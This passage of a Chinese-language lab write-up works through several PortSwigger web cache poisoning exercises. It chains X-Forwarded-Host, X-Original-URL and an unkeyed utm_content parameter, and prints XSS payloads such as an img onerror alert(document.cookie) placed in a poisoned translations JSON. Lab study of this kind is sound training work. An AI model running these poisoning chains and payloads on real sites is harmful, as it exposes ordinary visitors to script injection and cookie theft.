+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052034043.png" title="image-20231005203429968" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052034043.png" alt="image-20231005203429968"></a></p>
+<p>进行缓存投毒</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052035802.png" title="image-20231005203510712" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052035802.png" alt="image-20231005203510712"></a></p>
+<p>如何这个时候直接访问页面的话，会发现cors错误</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052039683.png" title="image-20231005203945614" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052039683.png" alt="image-20231005203945614"></a></p>
+<p>因为是跨域请求资源，所以得配置一下cors</p>
+<p><code>Access-Control-Allow-Origin: *</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052049146.png" title="image-20231005204942069" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052049146.png" alt="image-20231005204942069"></a></p>
+<p>再重新缓存投毒</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052042680.png" title="image-20231005204208589" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052042680.png" alt="image-20231005204208589"></a></p>
+<p>再次访问就会弹窗</p>
+<p>为了让靶场的bot访问页面，我就是要intruder一直发一直缓存，直到bot访问页面造成弹窗</p>
+<p>md，一直不能solved，不管了，反正我是成功了的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052104444.png" title="image-20231005210415342" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310052104444.png" alt="image-20231005210415342"></a></p>
+<h2 id="结合-Web-缓存中毒漏洞"><a href="#结合-Web-缓存中毒漏洞" class="headerlink" title="结合 Web 缓存中毒漏洞"></a>结合 Web 缓存中毒漏洞</h2><blockquote>
+<p>本实验容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">网络缓存中毒的</a>影响，但前提是您构建了复杂的漏洞利用链。</p>
+<p>用户大约每分钟访问一次主页，并且他们的语言设置为英语。<code>alert(document.cookie)</code>要完成此实验，请使用在访问者浏览器中 执行的响应来毒害缓存。</p>
+</blockquote>
+<p>先用parma miner来查看哪些标头会对响应包产生影响</p>
+<p><code>x-forwarded-host</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310072124323.png" title="image-20231007212326728" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310072124323.png" alt="image-20231007212326728"></a></p>
+<p><code>x-forwarded-host</code>会影响<code>data.host</code>的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310072124259.png" title="image-20231007212439165" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310072124259.png" alt="image-20231007212439165"></a></p>
+<p>然后这里有函数调用了<code>data.host</code>的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310072125758.png" title="image-20231007212541657" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310072125758.png" alt="image-20231007212541657"></a></p>
+<p>函数文件为<code>/resources/js/translations.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initTranslations</span>(<span class="params">jsonUrl</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取cookie里键为lang的值，并返回lang的值</span></span><br><span class="line">    <span class="keyword">const</span> lang = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">        .<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p[<span class="number">0</span>] === <span class="string">&#x27;lang&#x27;</span>)</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function"><span class="params">p</span> =&gt;</span> p[<span class="number">1</span>])</span><br><span class="line">        .<span class="title function_">find</span>(<span class="function">() =&gt;</span> <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历字典dict，并判断当前元素的innerHTML属性是否与字典的键（即k）相等，如果相等就将当前元素的innerHTML属性设置为字典的对应值。否则，遍历当前元素的子节点对每个子节点递归调用translate函数</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">translate</span> = (<span class="params">dict, el</span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> k <span class="keyword">in</span> dict) &#123;</span><br><span class="line">            <span class="keyword">if</span> (el.<span class="property">innerHTML</span> === k) &#123;</span><br><span class="line">                el.<span class="property">innerHTML</span> = dict[k];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                el.<span class="property">childNodes</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">el_</span> =&gt;</span> <span class="title function_">translate</span>(dict, el_));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过fetch api从jsonUrl地址获取json格式的数据</span></span><br><span class="line">    <span class="comment">//并从当前页面获取id为lang-select的元素，此为一个下拉选择框元素</span></span><br><span class="line">    <span class="comment">//如果获取到对应元素，则遍历json格式的数据j的键名，并从中提取name的值</span></span><br><span class="line">    <span class="comment">//创建一个名为option的元素，并设置其value属性的值为code的值，此code即遍历json格式的数据j的键名</span></span><br><span class="line">    <span class="comment">//设置option元素的文本内容为当前键的name属性值</span></span><br><span class="line">    <span class="comment">//将创建的option元素添加为下拉选择框的子元素</span></span><br><span class="line">    <span class="comment">//如果当前键的值与变量lang的值相等，则将下拉选择框选中项设置为当前添加的选项</span></span><br><span class="line">    <span class="title function_">fetch</span>(jsonUrl)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">j</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> select = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;lang-select&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (select) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">const</span> code <span class="keyword">in</span> j) &#123;</span><br><span class="line">                    <span class="keyword">const</span> name = j[code].<span class="property">name</span>;</span><br><span class="line">                    <span class="keyword">const</span> el = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;option&quot;</span>);</span><br><span class="line">                    el.<span class="title function_">setAttribute</span>(<span class="string">&quot;value&quot;</span>, code);</span><br><span class="line">                    el.<span class="property">innerText</span> = name;</span><br><span class="line">                    select.<span class="title function_">appendChild</span>(el);</span><br><span class="line">                    <span class="keyword">if</span> (code === lang) &#123;</span><br><span class="line">                        select.<span class="property">selectedIndex</span> = select.<span class="property">childElementCount</span> - <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果lang存在于JSON数据对象中，并且不是en，并且j[lang].translations存在，那么将执行translate函数来翻译maincontainer元素的文本内容。</span></span><br><span class="line">            lang <span class="keyword">in</span> j &amp;&amp; lang.<span class="title function_">toLowerCase</span>() !== <span class="string">&#x27;en&#x27;</span> &amp;&amp; j[lang].<span class="property">translations</span> &amp;&amp; <span class="title function_">translate</span>(j[lang].<span class="property">translations</span>, <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;maincontainer&#x27;</span>)[<span class="number">0</span>]);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他原本请求的json数据如下</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081047891.png" title="image-20231008104718766" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081047891.png" alt="image-20231008104718766"></a></p>
+<p>然后我们通过缓存投毒可控的地方为</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081050656.png" title="image-20231008105032617" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081050656.png" alt="image-20231008105032617"></a></p>
+<p>控制innerHTML即可控制网页源码</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081050318.png" title="image-20231008105055249" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081050318.png" alt="image-20231008105055249"></a></p>
+<p>总结来说，就是通过翻译，可以把对应的英文字符串替换为其他语言的</p>
+<p>如果翻译为中文</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081057178.png" title="image-20231008105759051" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081057178.png" alt="image-20231008105759051"></a></p>
+<p>将<code>view details</code>替换为<code>查看详细</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081058999.png" title="image-20231008105827868" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081058999.png" alt="image-20231008105827868"></a></p>
+<p>所以只要控制这里，将其替换为xss payload，即可进行攻击</p>
+<p>exploit-server配置如下:</p>
+<p>因为是跨域的，所以需要设置cors</p>
+<p><code>Access-Control-Allow-Origin: *</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081114214.png" title="image-20231008111411140" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081114214.png" alt="image-20231008111411140"></a></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;English&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;translations&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Return to list&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Volver a la lista&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;View details&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;img src=x onerror=alert(document.cookie)&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Description:&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Descripcin:&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;es&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;espa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;translations&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Return to list&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;View details&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;img src=x onerror=alert(document.cookie)&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Description:&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Descripcin:&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先测试一下使用其他语言能否弹窗</p>
+<p>投毒</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081113040.png" title="image-20231008111329943" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081113040.png" alt="image-20231008111329943"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081113788.png" title="image-20231008111314694" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081113788.png" alt="image-20231008111314694"></a></p>
+<p>发现使用其他语言是会弹窗的。</p>
+<p>但是这里有个问题，只有cookie里lang的值不为en的时候才会执行他的翻译函数，而受害者又偏偏是使用的英语。</p>
+<p>在通过下拉框选择语言的时候，可以发现会请求<code>https://0ab500b90310aed680d96c3b002b0080.web-security-academy.net/setlang/es?</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081122381.png" title="image-20231008112208309" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081122381.png" alt="image-20231008112208309"></a></p>
+<p>然后通过这个来设置cookie里lang的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081129887.png" title="image-20231008112917795" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081129887.png" alt="image-20231008112917795"></a></p>
+<p>但是无法进行缓存，因为他有<code>Set-Cookie</code>返回头</p>
+<p>但是可以发现主页有使用反斜杠作为路径分割的，服务器会通过重定向来将他们规范为正斜杠</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081130658.png" title="image-20231008113023557" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081130658.png" alt="image-20231008113023557"></a></p>
+<p>类似于这样</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081448855.png" title="image-20231008144816740" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081448855.png" alt="image-20231008144816740"></a></p>
+<p>这样就不会有<code>Set-Cookie</code>而且会存入缓存</p>
+<p>我之前忽视了一个标头<code>x-original-url</code>，这个自定义标头可以控制访问的路径，且会存入缓存，一般用来绕过访问控制</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081454482.png" title="image-20231008145450391" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081454482.png" alt="image-20231008145450391"></a></p>
+<p>当正常访问<code>/?a=123</code>的时候就会读取缓存的内容</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081500486.png" title="image-20231008150048401" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081500486.png" alt="image-20231008150048401"></a></p>
+<p>如果我们设置值为<code>/setlang/es</code>，那么就会返回正常访问<code>/setlang/es</code>的响应</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081455694.png" title="image-20231008145533604" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081455694.png" alt="image-20231008145533604"></a></p>
+<p>结合上面说的，通过反斜杠使服务器通过302跳转来规范为正斜杠的操作，让访问<code>/setlang/es</code>的响应没有<code>Set-Cookie</code>头，从而成功缓存</p>
+<p>所以设置为<code>X-Original-Url: /setlang\es</code>	</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081501661.png" title="image-20231008150107575" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081501661.png" alt="image-20231008150107575"></a></p>
+<p>这样一来，只要我们将主页进行缓存投毒，就可以强制让任何用户使用es翻译，从而进行弹窗</p>
+<p>先给访问json数据的url进行投毒</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081509207.png" title="image-20231008150911112" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081509207.png" alt="image-20231008150911112"></a></p>
+<p>再使用<code>X-Original-URL: /setlang\es</code>给<code>/</code>投毒</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081509858.png" title="image-20231008150943764" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081509858.png" alt="image-20231008150943764"></a></p>
+<p>然后访问主页，就会自动切换为es并进行dom xss</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081510859.png" title="image-20231008151028699" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310081510859.png" alt="image-20231008151028699"></a></p>
+<h2 id="通过非缓存键的查询字符串造成-Web-缓存中毒"><a href="#通过非缓存键的查询字符串造成-Web-缓存中毒" class="headerlink" title="通过非缓存键的查询字符串造成 Web 缓存中毒"></a>通过非缓存键的查询字符串造成 Web 缓存中毒</h2><blockquote>
+<p>该实验很容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">Web 缓存中毒的影响，</a>因为查询字符串不被视为缓存键。用户经常使用 Chrome 访问该网站的主页。</p>
+<p><code>alert(1)</code>要解决该实验室问题，请使用在受害者浏览器中 执行的响应来毒害主页。</p>
+</blockquote>
+<p>输入任意查询字符可以发现任然是获取的缓存，可以说明查询字符串不是缓存键</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142116026.png" title="image-20231014211039977" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142116026.png" alt="image-20231014211039977"></a></p>
+<p>方便测试，我们需要找到一个缓存破坏器</p>
+<p>我通过遍历headers的方式可以发现这个都可以用来作为缓存破坏器</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142119374.png" title="image-20231014211903294" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142119374.png" alt="image-20231014211903294"></a></p>
+<p>我就使用<code>Origin</code>了</p>
+<p>可以发现，查询字符串的内容会对页面造成影响</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142130673.png" title="image-20231014213054575" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142130673.png" alt="image-20231014213054575"></a></p>
+<p>如果是在link标签里直接xss的话，用户就只有通过按组合键才能触发</p>
+<blockquote>
+<ul>
+<li>在 Windows 上：<code>ALT+SHIFT+X</code></li>
+<li>在 MacOS 上：<code>CTRL+ALT+X</code></li>
+<li>在 Linux 上：<code>Alt+X</code></li>
+</ul>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142141005.png" title="image-20231014214137915" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142141005.png" alt="image-20231014214137915"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142141238.png" title="image-20231014214130147" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142141238.png" alt="image-20231014214130147"></a></p>
+<p>但是可以逃逸出link标签</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142144175.png" title="image-20231014214439069" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142144175.png" alt="image-20231014214439069"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142144432.png" title="image-20231014214452344" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142144432.png" alt="image-20231014214452344"></a></p>
+<p>把origin删除后，在进行投毒，就能让受害者弹窗</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142145340.png" title="image-20231014214539231" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142145340.png" alt="image-20231014214539231"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142145270.png" title="image-20231014214551177" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310142145270.png" alt="image-20231014214551177"></a></p>
+<h2 id="通过非缓存键的查询参数造成-Web-缓存中毒"><a href="#通过非缓存键的查询参数造成-Web-缓存中毒" class="headerlink" title="通过非缓存键的查询参数造成 Web 缓存中毒"></a>通过非缓存键的查询参数造成 Web 缓存中毒</h2><blockquote>
+<p>此实验容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">Web 缓存中毒的影响，</a>因为它从缓存密钥中排除了某个参数。用户经常使用 Chrome 访问该网站的主页。</p>
+<p><code>alert(1)</code>要解决该实验室问题，请使用在受害者浏览器中 执行的响应来毒害缓存。</p>
+</blockquote>
+<p>首先用param miner猜测一下查询参数名</p>
+<p>找到一个<code>utm_content</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152111143.png" title="image-20231015211153054" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152111143.png" alt="image-20231015211153054"></a></p>
+<p>带上这个参数访问，可以发现返回的是缓存内容，所以说明这个参数名不是缓存键</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152113282.png" title="image-20231015211343191" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152113282.png" alt="image-20231015211343191"></a></p>
+<p>但是如果是其他参数的话，就是缓存键了</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152114292.png" title="image-20231015211405194" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152114292.png" alt="image-20231015211405194"></a></p>
+<p>利用非缓存键的参数名进行缓存投毒</p>
+<p><code>/?utm_content=%27/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;link+href=%27</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152116722.png" title="image-20231015211655628" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152116722.png" alt="image-20231015211655628"></a></p>
+<p>然后访问主页就会造成弹窗</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152117062.png" title="image-20231015211718969" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310152117062.png" alt="image-20231015211718969"></a></p>
+<h2 id="隐藏参数"><a href="#隐藏参数" class="headerlink" title="隐藏参数"></a>隐藏参数</h2><blockquote>
+<p>此实验容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">Web 缓存中毒的影响，</a>因为它从缓存密钥中排除了某个参数。缓存和后端的参数解析也不一致。用户经常使用 Chrome 访问该网站的主页。</p>
+<p><code>alert(1)</code>要解决该实验室问题，请使用参数隐藏技术，通过在受害者浏览器中 执行的响应来毒害缓存。</p>
+</blockquote>
+<p>首先可以看到，查询字符串以及参数都在缓存键内</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211649053.png" title="image-20231021164902908" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211649053.png" alt="image-20231021164902908"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211649699.png" title="image-20231021164914590" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211649699.png" alt="image-20231021164914590"></a></p>
+<p>但是可能会有utm参数不在缓存键内，从而当做我们的缓存破坏器</p>
+<p>【utm参数就是用来分析推广数据的】</p>
+<p>用param miner来找此参数名，emmmm，没扫到，直接试试<code>utm_content</code>，发现确实不是缓存键(dog</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211704004.png" title="image-20231021170413898" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211704004.png" alt="image-20231021170413898"></a></p>
+<p>而且能被缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211744529.png" title="image-20231021174420436" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211744529.png" alt="image-20231021174420436"></a></p>
+<p>但是如果直接尝试利用这个参数进行缓存投毒造成xss的话，他会报错</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211743454.png" title="image-20231021174341351" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211743454.png" alt="image-20231021174341351"></a></p>
+<p>带上<code>utm_content</code>参数后，再用parma miner检测一下隐藏参数，前提是知道这个网站是用Ruby on Rails 框架搭建的</p>
